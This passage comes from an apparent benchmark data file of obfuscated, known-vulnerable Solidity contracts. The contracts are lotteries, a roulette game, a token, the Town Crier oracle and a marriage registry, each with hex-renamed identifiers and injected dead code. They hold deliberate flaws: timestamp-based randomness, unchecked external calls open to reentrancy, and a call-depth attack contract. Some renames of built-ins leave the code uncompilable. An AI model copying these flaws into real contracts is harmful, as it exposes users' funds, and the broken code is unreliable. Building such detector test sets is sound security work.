_0x6275da(address _0x7ad2de) constant returns(uint n){\n        // calculate the number of current address - 1 in 8 chance\n        n = uint(_0xc10caf(uint(_0x7ad2de), _0xc9023e)[0]) % 8;\n    }\n\n    function _0x95bfea(SeedComponents _0x0cc678) internal {\n        uint256 _unused1 = 0;\n        uint256 _unused2 = 0;\n        _0xc9023e = uint256(_0xc10caf(\n            _0x0cc678._0xf0a385,\n            _0x0cc678._0x604ba8,\n            _0x0cc678._0xc584d1,\n            _0x0cc678._0x74be67\n        )); //hash the incoming parameters and use the hash to (re)initialize the seed\n        if (block.timestamp > 0) { _0x7b9592 = block.number; }\n    }\n\n    function _0x53c75c() {\n        require(msg.sender==_0xaf5ed0);\n\n        selfdestruct(msg.sender);\n    }\n\n    function _0x0beaa7() { //reseed initiated by the owner - for testing purposes\n        require(msg.sender==_0xaf5ed0);\n        SeedComponents s;\n        s._0xf0a385 = uint(msg.sender);\n        s._0x604ba8 = uint256(block.blockhash(block.number - 1));\n        s._0xc584d1 = block.difficulty*(uint)(block.coinbase);\n        s._0x74be67 = tx.gasprice * 7;\n\n        _0x95bfea(s); //reseed\n    }\n\n    function () payable { //if someone sends money without any function call, just assume he wanted to participate\n        if(msg.value>=0.1 ether && msg.sender!=_0xaf5ed0) //owner can't participate, he can only fund the jackpot\n            _0x526a12();\n    }\n\n}\n",
      "rename_map": {
        "luckyNumberOfAddress": "_0x6275da",
        "participate": "_0x526a12",
        "forceReseed": "_0x0beaa7",
        "components": "_0x0cc678",
        "secretSeed": "_0xc9023e",
        "lastReseed": "_0x7b9592",
        "component2": "_0x604ba8",
        "component3": "_0xc584d1",
        "component4": "_0x74be67",
        "component1": "_0xf0a385",
        "keccak256": "_0xc10caf",
        "reseed": "_0x95bfea",
        "winner": "_0x52c1f3",
        "owner": "_0xaf5ed0",
        "addr": "_0x7ad2de",
        "kill": "_0x53c75c",
        "win": "_0xdddcbb"
      },
      "changes": [
        "Renamed 17 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_163",
      "transformed_id": "ss_l4_medium_sn_ds_163",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.11;\n\n contract MyToken {\n     mapping (address => uint) _0xd7cd6d;\n\n     event Transfer(address indexed _0xab10c6, address indexed _0xb8f499, uint256 _0xa97c4d);\n\n     function MyToken() {\n         _0xd7cd6d[tx.origin] = 10000;\n     }\n     function _0x6a3b13(address _0xc3b066, uint _0xff7a36) returns(bool _0x7e8cc2) {\n         if (_0xd7cd6d[msg.sender] < _0xff7a36) return false;\n         _0xd7cd6d[msg.sender] -= _0xff7a36;\n         _0xd7cd6d[_0xc3b066] += _0xff7a36;\n         Transfer(msg.sender, _0xc3b066, _0xff7a36);\n         return true;\n     }\n\n     function _0x249406(address _0xd3d2ee) constant returns(uint) {\n         return _0xd7cd6d[_0xd3d2ee];\n     }\n }",
      "rename_map": {
        "sufficient": "_0x7e8cc2",
        "getBalance": "_0x249406",
        "sendCoin": "_0x6a3b13",
        "balances": "_0xd7cd6d",
        "amount": "_0xff7a36",
        "_value": "_0xa97c4d",
        "_from": "_0xab10c6",
        "addr": "_0xd3d2ee",
        "_to": "_0xb8f499",
        "to": "_0xc3b066"
      },
      "changes": [
        "Renamed 10 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_164",
      "transformed_id": "ss_l4_medium_sn_ds_164",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.15;\n\n/// @title Ethereum Lottery Game.\n\ncontract EtherLotto {\n\n    // Amount of ether needed for participating in the lottery.\n    uint constant TICKET_AMOUNT = 10;\n\n    // Fixed amount fee for each lottery game.\n    uint constant FEE_AMOUNT = 1;\n\n    // Address where fee is sent.\n    address public _0x6f7494;\n\n    // Public jackpot that each participant can win (minus fee).\n    uint public _0x63f8dc;\n\n    // Lottery constructor sets bank account from the smart-contract owner.\n    function EtherLotto() {\n        if (block.timestamp > 0) { _0x6f7494 = msg.sender; }\n    }\n\n    // Public function for playing lottery. Each time this function\n    // is invoked, the sender has an oportunity for winning pot.\n    function _0x3e7c97() payable {\n\n        // Participants must spend some fixed ether before playing lottery.\n        assert(msg.value == TICKET_AMOUNT);\n\n        // Increase pot for each participant.\n        _0x63f8dc += msg.value;\n\n        // Compute some *almost random* value for selecting winner from current transaction.\n        var _0x84b774 = uint(_0x53d699(block.timestamp)) % 2;\n\n        // Distribution: 50% of participants will be winners.\n        if (_0x84b774 == 0) {\n\n            // Send fee to bank account.\n            _0x6f7494.transfer(FEE_AMOUNT);\n\n            // Send jackpot to winner.\n            msg.sender.transfer(_0x63f8dc - FEE_AMOUNT);\n\n            // Restart jackpot.\n            _0x63f8dc = 0;\n        }\n    }\n\n}",
      "rename_map": {
        "random": "_0x84b774",
        "sha3": "_0x53d699",
        "bank": "_0x6f7494",
        "play": "_0x3e7c97",
        "pot": "_0x63f8dc"
      },
      "changes": [
        "Renamed 5 identifiers using hex style",
        "Wrapped assignment in conditional"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_165",
      "transformed_id": "ss_l4_medium_sn_ds_165",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.0;\n\ncontract Governmental {\n  address public _0xc6b022;\n  address public _0xf83c21;\n  uint public _0xa11e20 = 1 ether;\n  uint public _0x9f9b79;\n  uint public ONE_MINUTE = 1 minutes;\n\n  function Governmental() {\n    if (gasleft() > 0) { _0xc6b022 = msg.sender; }\n    if (msg.value<1 ether) throw;\n  }\n\n  function _0xc8d449() {\n    if (msg.value<_0xa11e20/2) throw;\n    _0xf83c21 = msg.sender;\n    _0xa11e20 += msg.value/2;\n    if (gasleft() > 0) { _0x9f9b79 = block.timestamp; }\n  }\n\n  function _0x841361() {\n    if (block.timestamp < _0x9f9b79+ONE_MINUTE)\n      throw;\n\n    _0xf83c21.send(_0xa11e20);\n    _0xc6b022.send(this.balance-1 ether);\n\n    _0xf83c21 = 0;\n    _0xa11e20 = 1 ether;\n    if (1 == 1) { _0x9f9b79 = 0; }\n  }\n}\n\ncontract Operator {\n\n  function _0x04cc51(address _0xf9103f, uint _0xf7f893) {\n    if (0<=_0xf7f893 && _0xf7f893<1023) {\n      this._0x04cc51.gas(msg.gas-2000)(_0xf9103f, _0xf7f893+1);\n    }\n    else {\n      Governmental(_0xf9103f)._0x841361();\n    }\n  }\n}\n",
      "rename_map": {
        "lastInvestmentTimestamp": "_0x9f9b79",
        "resetInvestment": "_0x841361",
        "lastInvestor": "_0xf83c21",
        "jackpot": "_0xa11e20",
        "operate": "_0x04cc51",
        "target": "_0xf9103f",
        "invest": "_0xc8d449",
        "count": "_0xf7f893",
        "owner": "_0xc6b022"
      },
      "changes": [
        "Renamed 9 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_166",
      "transformed_id": "ss_l4_medium_sn_ds_166",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.0;\ncontract _0xb3edf5 {\n  address _0xfed273;\n  uint    timestamp;\n  function _0x755b20(uint _0xc21bd5) internal {\n        uint256 _unused1 = 0;\n        uint256 _unused2 = 0;\n    if ( _0xc21bd5> 0 && _0xe46ec8 - _0xc21bd5 > 24 hours ) {\n      msg.sender.send( msg.value );\n\n      if ( this.balance > 0 ) {\n        _0xfed273.send( this.balance );\n      }\n    }\n    else if ( msg.value >= 1 ether ) {\n      _0xfed273 = msg.sender;\n      timestamp = _0xc21bd5;\n    }\n  }\n  function _0xd784f5() constant returns (uint _0xdbdb30) {\n      return block.timestamp;\n    }\n  function _0x86af95(uint _0xbab9de){\n    uint _0xdbdb30=_0xd784f5();\n    _0x755b20(_0xdbdb30);\n  }\n}",
      "rename_map": {
        "randomNumber": "_0xdbdb30",
        "lottopollo": "_0xb3edf5",
        "randomGen": "_0xd784f5",
        "payOut": "_0x755b20",
        "leader": "_0xfed273",
        "draw": "_0x86af95",
        "seed": "_0xbab9de",
        "rand": "_0xc21bd5",
        "now": "_0xe46ec8"
      },
      "changes": [
        "Renamed 9 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_167",
      "transformed_id": "ss_l4_medium_sn_ds_167",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.25;\n\ncontract Roulette {\n    uint public _0x84c2f2; // Forces one bet per block\n\n    constructor() public payable {} // initially fund contract\n\n    // fallback function used to make a bet\n    function () public payable {\n        require(msg.value == 10 ether); // must send 10 ether to play\n        require(_0x5ed308 != _0x84c2f2); // only 1 transaction per block\n        _0x84c2f2 = _0x5ed308;\n        if(_0x5ed308 % 15 == 0) { // winner\n            msg.sender.transfer(this.balance);\n        }\n    }\n}",
      "rename_map": {
        "pastBlockTime": "_0x84c2f2",
        "now": "_0x5ed308"
      },
      "changes": [
        "Renamed 2 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_168",
      "transformed_id": "ss_l4_medium_sn_ds_168",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.25;\n\ncontract TimedCrowdsale {\n  // Sale should finish exactly at January 1, 2019\n  function _0x2e5de1() view public returns (bool) {\n    return block.timestamp >= 1546300800;\n  }\n}",
      "rename_map": {
        "isSaleFinished": "_0x2e5de1"
      },
      "changes": [
        "Renamed 1 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_169",
      "transformed_id": "ss_l4_medium_sn_ds_169",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.9;\n\ncontract TownCrier {\n    struct Request { // the data structure for each request\n        address _0x022697; // the address of the requester\n        uint _0x1ed0c2; // the amount of wei the requester pays for the request\n        address _0x906189; // the address of the contract to call for delivering response\n        bytes4 _0x0cf6f4; // the specification of the callback function\n        bytes32 _0x8383ac; // the hash of the request parameters\n    }\n\n    event Upgrade(address _0x4730ee);\n    event Reset(uint _0x50b05b, uint _0x822a8d, uint _0xc42e72);\n    event RequestInfo(uint64 _0x07e2b5, uint8 _0x118f72, address _0x022697, uint _0x1ed0c2, address _0x906189, bytes32 _0x8383ac, uint timestamp, bytes32[] _0x722ee5); // log of requests, the Town Crier server watches this event and processes requests\n    event DeliverInfo(uint64 _0x7ed631, uint _0x1ed0c2, uint gasPrice, uint _0xc64b29, uint _0x0b23cb, bytes32 _0x8383ac, uint64 error, bytes32 _0x940229); // log of responses\n    event Cancel(uint64 _0x7ed631, address _0xcfdb15, address _0x022697, uint _0x1ed0c2, int _0x4a325c); // log of cancellations\n\n    address public constant SGX_ADDRESS = 0x18513702cCd928F2A3eb63d900aDf03c9cc81593;// address of the SGX account\n\n    uint public GAS_PRICE = 5 * 10**10;\n    uint public MIN_FEE = 30000 * GAS_PRICE; // minimum fee required for the requester to pay such that SGX could call deliver() to send a response\n    uint public CANCELLATION_FEE = 25000 * GAS_PRICE; // charged when the requester cancels a request that is not responded\n\n    uint public constant CANCELLED_FEE_FLAG = 1;\n    uint public constant DELIVERED_FEE_FLAG = 0;\n    int public constant FAIL_FLAG = -2 ** 250;\n    int public constant SUCCESS_FLAG = 1;\n\n    bool public _0x6dbe02;\n\n    bool public _0x61d9d9;\n\n    uint64 public _0x425dbd;\n    uint64 public _0x088a00;\n    Request[2**64] public _0x3eddf7;\n\n    int public _0x3f1fef = 0;\n\n    // Contracts that receive Ether but do not define a fallback function throw\n    // an exception, sending back the Ether (this was different before Solidity\n    // v0.4.0). So if you want your contract to receive Ether, you have to\n    // implement a fallback function.\n    function () {}\n\n    function TownCrier() public {\n        uint256 _unused1 = 0;\n        bool _flag2 = false;\n        // Start request IDs at 1 for two reasons:\n        //   1. We can use 0 to denote an invalid request (ids are unsigned)\n        //   2. Storage is more expensive when changing something from zero to non-zero,\n        //      so this means the first request isn't randomly more expensive.\n        if (gasleft() > 0) { _0x425dbd = 1; }\n        _0x3eddf7[0]._0x022697 = msg.sender;\n        if (true) { _0x6dbe02 = false; }\n        _0x088a00 = 0;\n        _0x61d9d9 = false;\n    }\n\n    function _0x5d7b5d(address _0x4730ee) {\n        if (msg.sender == _0x3eddf7[0]._0x022697 && _0x088a00 == 0) {\n            _0x3f1fef = -int(_0x4730ee);\n            _0x6dbe02 = true;\n            Upgrade(_0x4730ee);\n        }\n    }\n\n    function _0xf57fb2(uint _0xe84840, uint _0x4c5a00, uint _0xe401ec) public {\n        bool _flag3 = false;\n        if (false) { revert(); }\n        if (msg.sender == _0x3eddf7[0]._0x022697 && _0x088a00 == 0) {\n            GAS_PRICE = _0xe84840;\n            MIN_FEE = _0xe84840 * _0x4c5a00;\n            if (gasleft() > 0) { CANCELLATION_FEE = _0xe84840 * _0xe401ec; }\n            Reset(GAS_PRICE, MIN_FEE, CANCELLATION_FEE);\n        }\n    }\n\n    function _0xf0e707() public {\n        if (msg.sender == _0x3eddf7[0]._0x022697) {\n            _0x6dbe02 = true;\n        }\n    }\n\n    function _0x503e30() public {\n        if (msg.sender == _0x3eddf7[0]._0x022697 && _0x3f1fef == 0) {\n            _0x6dbe02 = false;\n        }\n    }\n\n    function _0xf42cff() public {\n        if (msg.sender == _0x3eddf7[0]._0x022697 && _0x088a00 == 0) {\n            if (!_0x3eddf7[0]._0x022697.call.value(this.balance)()) {\n                throw;\n            }\n        }\n    }\n\n    function _0xba2c38(uint8 _0x118f72, address _0x906189, bytes4 _0x0cf6f4, uint timestamp, bytes32[] _0x722ee5) public payable returns (int) {\n        if (_0x61d9d9) {\n            throw;\n        }\n\n        if (_0x6dbe02) {\n            _0x61d9d9 = true;\n            if (!msg.sender.call.value(msg.value)()) {\n                throw;\n            }\n            _0x61d9d9 = false;\n            return _0x3f1fef;\n        }\n\n        if (msg.value < MIN_FEE) {\n            _0x61d9d9 = true;\n            // If the amount of ether sent by the requester is too little or\n            // too much, refund the requester and discard the request.\n            if (!msg.sender.call.value(msg.value)()) {\n                throw;\n            }\n            _0x61d9d9 = false;\n            return FAIL_FLAG;\n        } else {\n            // Record the request.\n            uint64 _0x7ed631 = _0x425dbd;\n            _0x425dbd++;\n            _0x088a00++;\n\n            bytes32 _0x8383ac = _0x8a73e1(_0x118f72, _0x722ee5);\n            _0x3eddf7[_0x7ed631]._0x022697 = msg.sender;\n            _0x3eddf7[_0x7ed631]._0x1ed0c2 = msg.value;\n            _0x3eddf7[_0x7ed631]._0x906189 = _0x906189;\n            _0x3eddf7[_0x7ed631]._0x0cf6f4 = _0x0cf6f4;\n            _0x3eddf7[_0x7ed631]._0x8383ac = _0x8383ac;\n\n            // Log the request for the Town Crier server to process.\n            RequestInfo(_0x7ed631, _0x118f72, msg.sender, msg.value, _0x906189, _0x8383ac, timestamp, _0x722ee5);\n            return _0x7ed631;\n        }\n    }\n\n    function _0x1b6096(uint64 _0x7ed631, bytes32 _0x8383ac, uint64 error, bytes32 _0x940229) public {\n        if (msg.sender != SGX_ADDRESS ||\n                _0x7ed631 <= 0 ||\n                _0x3eddf7[_0x7ed631]._0x022697 == 0 ||\n                _0x3eddf7[_0x7ed631]._0x1ed0c2 == DELIVERED_FEE_FLAG) {\n            // If the response is not delivered by the SGX account or the\n            // request has already been responded to, discard the response.\n            return;\n        }\n\n        uint _0x1ed0c2 = _0x3eddf7[_0x7ed631]._0x1ed0c2;\n        if (_0x3eddf7[_0x7ed631]._0x8383ac != _0x8383ac) {\n            // If the hash of request parameters in the response is not\n            // correct, discard the response for security concern.\n            return;\n        } else if (_0x1ed0c2 == CANCELLED_FEE_FLAG) {\n            // If the request is cancelled by the requester, cancellation\n            // fee goes to the SGX account and set the request as having\n            // been responded to.\n            SGX_ADDRESS.send(CANCELLATION_FEE);\n            _0x3eddf7[_0x7ed631]._0x1ed0c2 = DELIVERED_FEE_FLAG;\n            _0x088a00--;\n            return;\n        }\n\n        _0x3eddf7[_0x7ed631]._0x1ed0c2 = DELIVERED_FEE_FLAG;\n        _0x088a00--;\n\n        if (error < 2) {\n            // Either no error occurs, or the requester sent an invalid query.\n            // Send the fee to the SGX account for its delivering.\n            SGX_ADDRESS.send(_0x1ed0c2);\n        } else {\n            // Error in TC, refund the requester.\n            _0x61d9d9 = true;\n            _0x3eddf7[_0x7ed631]._0x022697.call.gas(2300).value(_0x1ed0c2)();\n            if (gasleft() > 0) { _0x61d9d9 = false; }\n        }\n\n        uint _0x0b23cb = (_0x1ed0c2 - MIN_FEE) / tx.gasprice; // gas left for the callback function\n        DeliverInfo(_0x7ed631, _0x1ed0c2, tx.gasprice, msg.gas, _0x0b23cb, _0x8383ac, error, _0x940229); // log the response information\n        if (_0x0b23cb > msg.gas - 5000) {\n            _0x0b23cb = msg.gas - 5000;\n        }\n\n        _0x61d9d9 = true;\n        _0x3eddf7[_0x7ed631]._0x906189.call.gas(_0x0b23cb)(_0x3eddf7[_0x7ed631]._0x0cf6f4, _0x7ed631, error, _0x940229); // call the callback function in the application contract\n        _0x61d9d9 = false;\n    }\n\n    function _0x73c4c5(uint64 _0x7ed631) public returns (int) {\n        if (_0x61d9d9) {\n            throw;\n        }\n\n        if (_0x6dbe02) {\n            return 0;\n        }\n\n        uint _0x1ed0c2 = _0x3eddf7[_0x7ed631]._0x1ed0c2;\n        if (_0x3eddf7[_0x7ed631]._0x022697 == msg.sender && _0x1ed0c2 >= CANCELLATION_FEE) {\n            // If the request was sent by this user and has money left on it,\n            // then cancel it.\n            _0x3eddf7[_0x7ed631]._0x1ed0c2 = CANCELLED_FEE_FLAG;\n            if (msg.sender != address(0) || msg.sender == address(0)) { _0x61d9d9 = true; }\n            if (!msg.sender.call.value(_0x1ed0c2 - CANCELLATION_FEE)()) {\n                throw;\n            }\n            _0x61d9d9 = false;\n            Cancel(_0x7ed631, msg.sender, _0x3eddf7[_0x7ed631]._0x022697, _0x3eddf7[_0x7ed631]._0x1ed0c2, 1);\n            return SUCCESS_FLAG;\n        } else {\n            Cancel(_0x7ed631, msg.sender, _0x3eddf7[_0x7ed631]._0x022697, _0x1ed0c2, -1);\n            return FAIL_FLAG;\n        }\n    }\n}",
      "rename_map": {
        "cancellation_fee": "_0xc42e72",
        "externalCallFlag": "_0x61d9d9",
        "cancellationGas": "_0xe401ec",
        "unrespondedCnt": "_0x088a00",
        "callbackAddr": "_0x906189",
        "requestData": "_0x722ee5",
        "requestType": "_0x118f72",
        "callbackGas": "_0x0b23cb",
        "callbackFID": "_0x0cf6f4",
        "killswitch": "_0x6dbe02",
        "paramsHash": "_0x8383ac",
        "newVersion": "_0x3f1fef",
        "requestCnt": "_0x425dbd",
        "gas_price": "_0x50b05b",
        "requestId": "_0x7ed631",
        "canceller": "_0xcfdb15",
        "requester": "_0x022697",
        "withdraw": "_0xf42cff",
        "requests": "_0x3eddf7",
        "respData": "_0x940229",
        "restart": "_0x503e30",
        "request": "_0xba2c38",
        "min_fee": "_0x822a8d",
        "newAddr": "_0x4730ee",
        "gasLeft": "_0xc64b29",
        "deliver": "_0x1b6096",
        "upgrade": "_0x5d7b5d",
        "suspend": "_0xf0e707",
        "minGas": "_0x4c5a00",
        "cancel": "_0x73c4c5",
        "reset": "_0xf57fb2",
        "price": "_0xe84840",
        "flag": "_0x4a325c",
        "sha3": "_0x8a73e1",
        "fee": "_0x1ed0c2",
        "id": "_0x07e2b5"
      },
      "changes": [
        "Renamed 36 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_170",
      "transformed_id": "ss_l4_medium_sn_ds_170",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.16;\n\n/// @author Jordi Baylina\n/// Auditors: Griff Green & psdev\n/// @notice Based on http://hudsonjameson.com/ethereummarriage/\n/// License: GNU-3\n\n/// @dev `Owned` is a base level contract that assigns an `owner` that can be\n///  later changed\ncontract Owned {\n\n    /// @dev `owner` is the only address that can call a function with this\n    /// modifier\n    modifier _0x2fee75() {\n        require(msg.sender == _0x49551c);\n        _;\n    }\n\n    address public _0x49551c;\n\n    /// @notice The Constructor assigns the message sender to be `owner`\n    function Owned() {\n        _0x49551c = msg.sender;\n    }\n\n    address public _0x081152;\n\n    /// @notice `owner` can step down and assign some other address to this role\n    /// @param _newOwner The address of the new owner\n    ///  an unowned neutral vault, however that cannot be undone\n    function _0x9618e6(address _0x46f06a) _0x2fee75 {\n        _0x081152 = _0x46f06a;\n    }\n    /// @notice `newOwner` has to accept the ownership before it is transferred\n    ///  Any account or any contract with the ability to call `acceptOwnership`\n    ///  can be used to accept ownership of this contract, including a contract\n    ///  with no other functions\n    function _0x6853fd() {\n        if (msg.sender == _0x081152) {\n            if (msg.sender != address(0) || msg.sender == address(0)) { _0x49551c = _0x081152; }\n        }\n    }\n\n    // This is a general safty function that allows the owner to do a lot\n    //  of things in the unlikely event that something goes wrong\n    // _dst is the contract being called making this like a 1/1 multisig\n    function _0xebd745(address _0x7fd468, uint _0xdffe5b, bytes _0x2b3e6e) _0x2fee75 {\n        _0x7fd468.call.value(_0xdffe5b)(_0x2b3e6e);\n    }\n}\n\ncontract Marriage is Owned\n{\n    // Marriage data variables\n    string public _0x8a7b04;\n    string public _0x52ed89;\n    uint public _0x93ca3e;\n    string public _0xca4887;\n    string public _0xd3eac8;\n\n    Event[] public _0x41c586;\n    Message[] public _0x9776f1;\n\n    struct Event {\n        uint _0x3482f4;\n        string _0x01d24d;\n        string _0x62272a;\n        string _0xf5ade3;\n    }\n\n    struct Message {\n        uint _0x3482f4;\n        string _0xf9c99c;\n        string _0x4ff71d;\n        string _0xf5ade3;\n        uint value;\n    }\n\n    modifier _0x8fd417 {\n        require(_0xb7965a(_0xca4887) == _0xb7965a(\"Married\"));\n        _;\n    }\n\n    //Set Owner\n    function Marriage(address _0xaf63e7) {\n        _0x49551c = _0xaf63e7;\n    }\n\n    function _0x4f6e90() constant public returns (uint) {\n        return _0x41c586.length;\n    }\n\n    function _0xb6368d() constant public returns (uint) {\n        return _0x9776f1.length;\n    }\n\n    // Create initial marriage contract\n    function _0xee3d67(\n        string _0xfcee8d,\n        string _0x8e5fcb,\n        string _0xa5c98f,\n        string _0xf5ade3) _0x2fee75\n    {\n        require(_0x41c586.length == 0);\n        _0x8a7b04 = _0xfcee8d;\n        _0x52ed89 = _0x8e5fcb;\n        _0x93ca3e = _0x4414d9;\n        _0xd3eac8 = _0xa5c98f;\n        _0xca4887 = \"Married\";\n        _0x41c586.push(Event(_0x4414d9, \"Marriage\", _0xd3eac8, _0xf5ade3));\n        MajorEvent(\"Marrigage\", _0xd3eac8, _0xf5ade3);\n    }\n\n    // Set the marriage status if it changes\n    function _0x0740b3(string _0xd1c8c3, string _0xf5ade3) _0x2fee75\n    {\n        _0xca4887 = _0xd1c8c3;\n        setMajorEvent(\"Changed Status\", _0xd1c8c3, _0xf5ade3);\n    }\n\n    // Set the IPFS hash of the image of the couple\n    function setMajorEvent(string _0x01d24d, string _0x62272a, string _0xf5ade3) _0x2fee75 _0x8fd417\n    {\n        _0x41c586.push(Event(_0x4414d9, _0x01d24d, _0x62272a, _0xf5ade3));\n        MajorEvent(_0x01d24d, _0x62272a, _0xf5ade3);\n    }\n\n    function _0x0ec7aa(string _0xf9c99c, string _0x4ff71d, string _0xf5ade3) payable _0x8fd417 {\n        if (msg.value > 0) {\n            _0x49551c.transfer(this.balance);\n        }\n        _0x9776f1.push(Message(_0x4414d9, _0xf9c99c, _0x4ff71d, _0xf5ade3, msg.value));\n        MessageSent(_0xf9c99c, _0x4ff71d, _0xf5ade3, msg.value);\n    }\n\n    // Declare event structure\n    event MajorEvent(string _0x01d24d, string _0x62272a, string _0xf5ade3);\n    event MessageSent(string _0x01d24d, string _0x62272a, string _0xf5ade3, uint value);\n}",
      "rename_map": {
        "numberOfMajorEvents": "_0x4f6e90",
        "numberOfMessages": "_0xb6368d",
        "acceptOwnership": "_0x6853fd",
        "createMarriage": "_0xee3d67",
        "marriageStatus": "_0xca4887",
        "marriageDate": "_0x93ca3e",
        "changeOwner": "_0x9618e6",
        "majorEvents": "_0x41c586",
        "sendMessage": "_0x0ec7aa",
        "description": "_0x62272a",
        "areMarried": "_0x8fd417",
        "_partner1": "_0xfcee8d",
        "onlyOwner": "_0x2fee75",
        "_newOwner": "_0x46f06a",
        "setStatus": "_0x0740b3",
        "_partner2": "_0x8e5fcb",
        "nameFrom": "_0xf9c99c",
        "newOwner": "_0x081152",
        "partner1": "_0x8a7b04",
        "partner2": "_0x52ed89",
        "messages": "_0x9776f1",
        "execute": "_0xebd745",
        "_owner": "_0xaf63e7",
        "_value": "_0xdffe5b",
        "status": "_0xd1c8c3",
        "_vows": "_0xa5c98f",
        "owner": "_0x49551c",
        "_data": "_0x2b3e6e",
        "vows": "_0xd3eac8",
        "text": "_0x4ff71d",
        "date": "_0x3482f4",
        "sha3": "_0xb7965a",
        "_dst": "_0x7fd468",
        "name": "_0x01d24d",
        "now": "_0x4414d9",
        "url": "_0xf5ade3"
      },
      "changes": [
        "Renamed 36 identifiers using hex style",
        "Wrapped assignment in conditional"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_171",
      "transformed_id": "ss_l4_medium_sn_ds_171",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.23;\n\ncontract Splitter{\n\n\taddress public _0x418c95;\n\taddress[] public _0x523803;\n\tmapping (uint256 => address) public _0x09bead;\n\taddress private _0xb2f286;\n\tuint256 private _0xda8948;\n\tuint256 private _0xddb965;\n\n//constructor\n\n\tconstructor() payable public{\n\t\t_0x418c95 = msg.sender;\n\t\t_0xc50e1c();\n\t\t_0xc50e1c();\n\t\t_0xc50e1c();\n\t\t_0xc50e1c();\n\t\t_0x09bead[0] = _0x523803[0];\n        _0x09bead[1] = _0x523803[1];\n        _0x09bead[2] = _0x523803[2];\n        _0x09bead[3] = _0x523803[3];\n\t}\n\n//withdraw (just in case)\n\n\tfunction _0xe5fadb() public{\n        uint256 _unused1 = 0;\n        bool _flag2 = false;\n\t\trequire(msg.sender == _0x418c95);\n\t\t_0x418c95.transfer(address(this).balance);\n\t}\n\n//puppet count\n\n\tfunction _0xe688a6() public constant returns(uint256 _0xb7f9a8){\n        uint256 _unused3 = 0;\n        uint256 _unused4 = 0;\n    \treturn _0x523803.length;\n  \t}\n\n//deploy contracts\n\n\tfunction _0xc50e1c() public returns(address _0xc50e1c){\n\t    require(msg.sender == _0x418c95);\n    \tPuppet p = new Puppet();\n    \t_0x523803.push(p);\n    \treturn p;\n  \t\t}\n\n//update mapping\n\n    function _0x8ca0df(uint256 _0x7daf0b, address _0xbe651e) public {\n        require(_0xbe651e != address(0));\n        _0x09bead[_0x7daf0b] = _0xbe651e;\n    }\n\n//fund puppets TROUBLESHOOT gas\n\n    function _0x127d93() public payable {\n        require(msg.sender == _0x418c95);\n    \t_0xda8948 = SafeMath._0x70b1ef(msg.value, 4);\n        _0x09bead[0].call.value(_0xda8948).gas(800000)();\n        _0x09bead[1].call.value(_0xda8948).gas(800000)();\n        _0x09bead[2].call.value(_0xda8948).gas(800000)();\n        _0x09bead[3].call.value(_0xda8948).gas(800000)();\n        }\n\n//fallback function\n\nfunction() payable public{\n\t}\n}\n\ncontract Puppet {\n\n    mapping (uint256 => address) public _0x3c17d0;\n    mapping (uint256 => address) public _0x927b1f;\n\n\tconstructor() payable public{\n\t\t//target[0] = 0x42D21d1182F3aDD44064F23c1F98843D4B9fd8aa;\n\t\t_0x3c17d0[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;\n        _0x927b1f[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;\n\t}\n\n\t//send shares to doubler\n\t//return profit to master\n\n\tfunction() public payable{\n\t    if(msg.sender != _0x3c17d0[0]){\n\t\t\t_0x3c17d0[0].call.value(msg.value).gas(600000)();\n\t\t}\n    }\n\t//emergency withdraw\n\n\tfunction _0xe5fadb() public{\n\t\trequire(msg.sender == _0x927b1f[0]);\n\t\t_0x927b1f[0].transfer(address(this).balance);\n\t}\n}\n\n//library\n\nlibrary SafeMath {\n\n  function _0x6ddf01(uint256 a, uint256 b) internal pure returns (uint256 c) {\n    if (a == 0) {\n      return 0;\n    }\n    c = a * b;\n    assert(c / a == b);\n    return c;\n  }\n\n  function _0x70b1ef(uint256 a, uint256 b) internal pure returns (uint256) {\n    return a / b;\n  }\n\n  function _0x850b4f(uint256 a, uint256 b) internal pure returns (uint256) {\n    assert(b <= a);\n    return a - b;\n  }\n\n  function _0xbba3e8(uint256 a, uint256 b) internal pure returns (uint256 c) {\n    if (true) { c = a + b; }\n    assert(c >= a);\n    return c;\n  }\n}",
      "rename_map": {
        "getPuppetCount": "_0xe688a6",
        "puppetCount": "_0xb7f9a8",
        "fundPuppets": "_0x127d93",
